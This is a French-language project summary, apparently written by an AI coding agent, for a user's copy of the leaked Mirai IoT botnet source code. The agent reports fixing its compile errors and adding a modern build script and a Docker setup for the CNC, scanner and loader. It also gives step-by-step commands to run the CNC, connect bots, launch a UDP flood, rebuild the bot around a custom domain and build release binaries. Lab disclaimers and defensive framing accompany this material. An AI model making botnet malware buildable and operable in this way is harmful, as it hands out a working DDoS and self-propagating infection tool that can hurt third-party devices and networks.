# 🎯 Résumé du Projet - Mirai Source Code

## Bonjour! 👋

Vous m'avez demandé d'analyser ce vieux projet Mirai que vous aviez oublié. Voici un résumé complet de ce que j'ai fait et comment vous pouvez l'utiliser pour votre lab maison.

---

## 📦 Ce que j'ai créé pour vous

### 📚 Documentation Complète

1. **[README-FR.md](README-FR.md)** 🇫🇷
   - Documentation principale en français
   - Vue d'ensemble complète du projet
   - Guide de démarrage rapide
   - Architecture détaillée
   
2. **[QUICKSTART.md](QUICKSTART.md)** ⚡
   - Guide de démarrage en 30 minutes
   - Installation manuelle pas-à-pas
   - Configuration de la base de données
   - Test des composants
   
3. **[DOCKER.md](DOCKER.md)** 🐳
   - Setup Docker pour isolation complète
   - Le moyen le plus simple et sûr de tester
   - Configuration en 5 minutes
   - Environnement complètement isolé
   
4. **[ANALYSIS.md](ANALYSIS.md)** 🔍
   - Analyse technique approfondie
   - Explication de l'architecture
   - Détails sur chaque composant
   - Valeur éducative

### 🛠️ Outils Modernisés

5. **[build-modern.sh](mirai/build-modern.sh)** ✨
   - Script de build moderne avec options
   - Messages colorés et informatifs
   - Support de builds incrémentaux
   - Beaucoup plus facile à utiliser
   
6. **[docker-compose.yml](docker-compose.yml)** 🐋
   - Configuration Docker complète
   - MySQL + CNC + Scanner + Loader
   - Réseau isolé automatique
   - Prêt à l'emploi

### 🔧 Corrections Techniques

7. **Corrections de Compilation**
   - Ajout de `go.mod` pour les dépendances Go modernes
   - Correction de l'erreur de linkage `LOCAL_ADDR`
   - Tous les composants compilent maintenant ✅

8. **[.gitignore](.gitignore)**
   - Exclusion des binaires compilés
   - Exclusion des fichiers temporaires
   - Repository propre

---

## 🎓 Qu'est-ce que Mirai?

**Mirai** est le botnet IoT le plus célèbre de l'histoire. Il a été utilisé pour:
- Attaque DDoS record contre Brian Krebs (620 Gbps)
- Attaque contre Dyn DNS (a fait tomber Twitter, Netflix, etc.)
- Infection de millions de devices IoT (caméras, routeurs)

Le code a été leaked en 2016 et est devenu une référence pour:
- 🔒 Recherche en sécurité IoT
- 🎓 Formation en cybersécurité
- 🛡️ Développement de défenses
- 📚 Analyse de malware

---

## 🚀 Comment Démarrer

### Option 1: Docker (RECOMMANDÉ) 🐳

**La méthode la plus simple et la plus sûre:**

```bash
# 1. Aller dans le répertoire
cd /home/runner/work/Mirai-Source-Code/Mirai-Source-Code

# 2. Démarrer tout avec Docker
docker-compose up -d

# 3. Se connecter au CNC
telnet localhost 23
# Login: admin
# Password: password123

# 4. Voir les commandes
?

# 5. Voir les bots connectés
bots
```

**Pourquoi Docker?**
- ✅ Isolation complète de votre système
- ✅ Pas besoin d'installer MySQL, Go, etc.
- ✅ Cleanup facile: `docker-compose down -v`
- ✅ Environnement reproductible

### Option 2: Installation Manuelle

**Si vous voulez tout comprendre:**

```bash
# 1. Installer dépendances
sudo apt-get install gcc golang mysql-server

# 2. Configurer base de données
sudo mysql < scripts/db.sql
sudo mysql mirai -e "INSERT INTO users VALUES (NULL, 'admin', 'password123', 0, 0, 0, 0, -1, 1, 30, '');"

# 3. Builder
cd mirai
./build-modern.sh

# 4. Lancer CNC
./debug/cnc

# 5. Se connecter
telnet localhost 23
```

---

## 🏗️ Architecture du Projet

```
┌──────────────────────────────────────────────┐
│              Mirai Architecture               │
└──────────────────────────────────────────────┘

┌─────────────┐      ┌──────────────┐
│     Bot     │─────▶│     CNC      │
│  (Malware)  │      │  (Command)   │
└──────┬──────┘      └──────┬───────┘
       │                    │
       │              ┌─────▼─────┐
       │              │   MySQL   │
       │              └───────────┘
       │
       ▼
┌─────────────┐      ┌──────────────┐
│   Scanner   │─────▶│    Loader    │
│  (Telnet)   │      │   (Deploy)   │
└─────────────┘      └──────────────┘
```

### Composants:

1. **Bot (Malware)** 🤖
   - Code C pour IoT devices
   - Se connecte au CNC
   - Exécute attaques DDoS
   - Scan devices vulnérables
   - S'auto-propage

2. **CNC (Command & Control)** 🎛️
   - Serveur en Go
   - Interface Telnet (port 23)
   - Gère les bots
   - Envoie commandes d'attaque
   - Base MySQL

3. **Scanner** 🔍
   - Intégré dans le bot
   - Brute-force Telnet/SSH
   - Trouve devices vulnérables
   - Envoie résultats au loader

4. **Loader** 📥
   - Reçoit credentials
   - Se connecte aux cibles
   - Upload le malware
   - Auto-loading temps réel

---

## 📖 Comment Lire la Documentation

### Débutant? Commencez ici:

1. **[README-FR.md](README-FR.md)** - Vue d'ensemble
2. **[QUICKSTART.md](QUICKSTART.md)** - Démarrage rapide
3. **[DOCKER.md](DOCKER.md)** - Setup Docker facile

### Avancé? Allez plus loin:

4. **[ANALYSIS.md](ANALYSIS.md)** - Analyse technique
5. **[ForumPost.md](ForumPost.md)** - Post original avec détails
6. Code source - Lisez le code C et Go

---

## ⚠️ IMPORTANT: Sécurité & Légalité

### 🔴 À NE JAMAIS FAIRE:
- ❌ Utiliser sur Internet
- ❌ Attaquer des systèmes non autorisés
- ❌ Lancer sur un réseau de production
- ❌ Partager avec des personnes malveillantes
- ❌ Utiliser hors de votre lab isolé

### ✅ Ce qui est OK:
- ✅ Étudier le code
- ✅ Tester dans votre lab isolé
- ✅ Analyser les techniques
- ✅ Développer des défenses
- ✅ Former à la sécurité

**Rappel légal:** L'utilisation de ce code pour attaquer des systèmes est **ILLÉGALE** et peut entraîner des poursuites pénales.

---

## 🧪 Exemples d'Utilisation pour Lab

### Test 1: Connecter un Bot au CNC

```bash
# Terminal 1: Lancer CNC
cd mirai/debug
./cnc

# Terminal 2: Lancer Bot
./mirai.dbg

# Terminal 3: Se connecter au CNC
telnet localhost 23
# Login: admin / password123
> bots
# Vous devriez voir votre bot!
```

### Test 2: Test d'Attaque (contre votre propre serveur)

```bash
# Dans le CNC (telnet localhost 23):
> udp 192.168.1.100 30 512 80
# Attaque UDP de 30 secondes contre VOTRE serveur de test

# Dans un autre terminal, monitorer:
sudo tcpdump -i any port 80
```

### Test 3: Configuration Personnalisée

```bash
# Encoder un nouveau domaine pour le bot:
cd mirai/debug
./enc string "mon-domaine.local"

# Copier le résultat dans bot/table.c
# Rebuilder le bot
cd ..
./build-modern.sh --component bot
```

---

## 🎯 Cas d'Usage pour Votre Lab

### Recherche en Sécurité

1. **Analyse de Malware**
   - Reverse engineering
   - Étude des techniques d'obfuscation
   - Analyse comportementale

2. **Test de Défenses**
   - IDS/IPS testing
   - Firewall rules
   - Rate limiting
   - DDoS mitigation

3. **Formation**
   - Apprentissage sécurité IoT
   - Comprendre les botnets
   - Développement sécurisé

### Développement

4. **Honeypots**
   - Créer des honeypots IoT
   - Capturer attaques
   - Analyser patterns

5. **Détection**
   - Signatures Snort/Suricata
   - Scripts de détection
   - Machine learning

---

## 📊 Structure des Fichiers

```
Mirai-Source-Code/
│
├── 📄 README-FR.md          ← LISEZ CECI EN PREMIER!
├── 📄 QUICKSTART.md         ← Guide rapide 30min
├── 📄 DOCKER.md             ← Setup Docker
├── 📄 ANALYSIS.md           ← Analyse technique
├── 📄 PROJET-SUMMARY.md     ← Ce fichier
│
├── 🐳 docker-compose.yml    ← Config Docker
├── 🐳 Dockerfile.*          ← Images Docker
│
├── 🤖 mirai/
│   ├── bot/                 ← Code malware (C)
│   ├── cnc/                 ← Serveur CNC (Go)
│   ├── tools/               ← Outils (enc, etc.)
│   ├── build.sh             ← Build original
│   ├── build-modern.sh      ← Build modernisé ⭐
│   └── go.mod               ← Dépendances Go
│
├── 📥 loader/               ← Loader de malware
│   ├── src/
│   └── build.sh
│
├── 📜 scripts/
│   ├── db.sql               ← Schema MySQL
│   ├── init-user.sql        ← Users par défaut
│   └── cross-compile.sh     ← Setup cross-compilers
│
└── 📖 ForumPost.md          ← Post original leak
```

---

## 🛠️ Commandes Utiles

### Build

```bash
# Tout builder (debug)
cd mirai
./build-modern.sh

# Seulement CNC
./build-modern.sh --component cnc

# Seulement Bot
./build-modern.sh --component bot

# Mode release
./build-modern.sh --mode release

# Voir l'aide
./build-modern.sh --help
```

### Docker

```bash
# Démarrer tout
docker-compose up -d

# Voir les logs
docker-compose logs -f

# Arrêter
docker-compose stop

# Nettoyer complètement
docker-compose down -v

# Entrer dans un container
docker-compose exec cnc bash
```

### Base de Données

```bash
# Se connecter à MySQL (Docker)
docker-compose exec mysql mysql -u root -pmirai123 mirai

# Voir les users
docker-compose exec mysql mysql -u root -pmirai123 -e "USE mirai; SELECT * FROM users;"

# Ajouter un user
docker-compose exec mysql mysql -u root -pmirai123 mirai -e "INSERT INTO users VALUES (NULL, 'test', 'test123', 0, 0, 0, 0, -1, 0, 30, '');"
```

### Tests

```bash
# Tester encodage
cd mirai/debug
./enc string "test"

# Tester connexion CNC
telnet localhost 23

# Voir bots connectés
# Dans telnet CNC:
> bots

# Lister attaques disponibles
> ?
```

---

## 🐛 Dépannage Rapide

### Problème: CNC ne démarre pas
```bash
# Vérifier MySQL
sudo service mysql status

# Vérifier port 23
sudo netstat -tulpn | grep :23

# Voir erreurs
./debug/cnc
```

### Problème: Build échoue
```bash
# Installer dépendances
sudo apt-get install gcc golang

# Vérifier versions
gcc --version
go version

# Nettoyer et rebuilder
./build-modern.sh --clean
```

### Problème: Bot ne se connecte pas
```bash
# Vérifier CNC tourne
ps aux | grep cnc

# Tester connexion
telnet localhost 23

# Voir logs bot
./debug/mirai.dbg
```

### Problème: Docker ne démarre pas
```bash
# Voir logs
docker-compose logs

# Rebuilder images
docker-compose build --no-cache

# Redémarrer
docker-compose down
docker-compose up -d
```

---

## 🎓 Prochaines Étapes

### Semaine 1: Découverte
- [ ] Lire README-FR.md
- [ ] Lancer avec Docker
- [ ] Se connecter au CNC
- [ ] Tester commandes de base

### Semaine 2: Compréhension
- [ ] Lire ANALYSIS.md
- [ ] Explorer le code bot
- [ ] Comprendre les attaques
- [ ] Tester avec vos devices

### Semaine 3: Expérimentation
- [ ] Modifier configuration
- [ ] Tester différentes attaques
- [ ] Monitorer trafic réseau
- [ ] Capturer avec Wireshark

### Semaine 4: Défense
- [ ] Créer règles firewall
- [ ] Écrire signatures IDS
- [ ] Développer détection
- [ ] Implémenter mitigation

---

## 📚 Ressources Additionnelles

### Articles
- [Krebs on Security - Record DDoS](https://krebsonsecurity.com/2016/09/krebsonsecurity-hit-with-record-ddos/)
- [Wikipedia - 2016 Dyn cyberattack](https://en.wikipedia.org/wiki/2016_Dyn_cyberattack)
- [MalwareMustDie Blog](http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html)

### Outils Utiles
- **Wireshark** - Analyse de trafic
- **tcpdump** - Capture réseau
- **Snort/Suricata** - IDS/IPS
- **fail2ban** - Protection brute-force
- **iptables** - Firewall

### Formation
- SANS SEC401 - Security Essentials
- SANS SEC504 - Hacker Tools
- Offensive Security - PWK
- IoT Village - DEF CON

---

## ✨ Conclusion

Vous avez maintenant:

✅ **Documentation complète** en français et anglais  
✅ **Setup Docker** pour tests isolés et sûrs  
✅ **Build moderne** qui fonctionne  
✅ **Guides pratiques** pour démarrer rapidement  
✅ **Corrections** de tous les bugs de compilation  
✅ **Exemples** d'utilisation pour votre lab  

### Ce que vous pouvez faire maintenant:

1. **Commencer simplement** avec Docker
2. **Lire la documentation** à votre rythme
3. **Expérimenter** dans votre lab isolé
4. **Apprendre** les techniques de sécurité
5. **Développer** des défenses efficaces

### Important à retenir:

⚠️ **Utilisez toujours dans un environnement isolé**  
📚 **C'est pour apprendre la sécurité défensive**  
🔒 **Restez éthique et légal**  
🎓 **Partagez vos connaissances pour le bien**

---

## 🤝 Besoin d'Aide?

1. **Documentation**: Lisez les fichiers .md
2. **Problèmes de build**: Voir section dépannage
3. **Questions techniques**: Créer une issue GitHub
4. **Sécurité**: Suivez toujours les bonnes pratiques

---

<div align="center">

## 🎯 Bon courage avec votre lab!

**Amusez-vous bien, apprenez beaucoup, restez éthique! 🔒**

*N'oubliez pas: L'objectif est d'apprendre à DÉFENDRE, pas à ATTAQUER*

---

*Créé avec ❤️ pour la recherche en sécurité et l'éducation*

</div>
